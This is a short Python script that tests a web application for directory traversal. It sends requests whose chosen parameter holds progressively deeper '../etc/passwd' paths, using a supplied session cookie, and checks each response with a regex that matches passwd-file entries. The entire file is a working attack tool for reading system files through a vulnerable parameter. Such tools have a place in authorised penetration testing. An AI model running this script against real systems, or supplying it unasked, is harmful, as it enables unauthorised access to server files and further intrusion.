from RequestPayloader import HTTPRequestHandler
import re
import sys

def check_for_etcpasswd(response):
    # Regular expression pattern to match lines in the /etc/passwd file
    regex = "([a-zA-Z-_]+):x:([0-9]+):([0-9]+):([a-zA-Z0-9- ]*):([/a-zA-Z]+):([/a-zA-Z]+)"
    
    # Check if the regex pattern is found in the response
    if re.search(regex, response) is None:
        return False  # No directory traversal possible

    return True  # Directory traversal possible

def main():
    # Check if there are fewer than 5 arguments passed to the script
    if sys.argv.__len__() < 5:
        # Print error message if not all required arguments are passed
        print("Error, not all sufficient arguments were passed.")
        exit(-1)  # Exit the program with error code -1

    # Assign command line arguments to variables
    base_url = sys.argv[1]
    file_param = sys.argv[2]
    cookie = sys.argv[3]
    depth = int(sys.argv[4])
    
    # Initialize HTTPRequestHandler with the base URL and cookie
    handler = HTTPRequestHandler(base_url, cookie)
    # Initial path for directory traversal attempt
    path = "../etc/passwd"

    # Loop through the depth to attempt directory traversal
    for i in range(depth):
        # Send an HTTP request with the current path as the parameter value
        response = handler.send_request(param=file_param, new_value=path)
        # Check if the response indicates a successful directory traversal
        if check_for_etcpasswd(response.text) is True:
            # Print the successful path and exit the program
            print(f"Directory traversal possible. Path: {path}")
            exit(0)
        else:
            # Modify the path to go one level deeper
            path = "../" + path

    # If no directory traversal was found, print a message
    print("Directory traversal not found in given scope")

if __name__ == "__main__":
    # Run the main function if the script is executed directly
    main()
    exit(0)
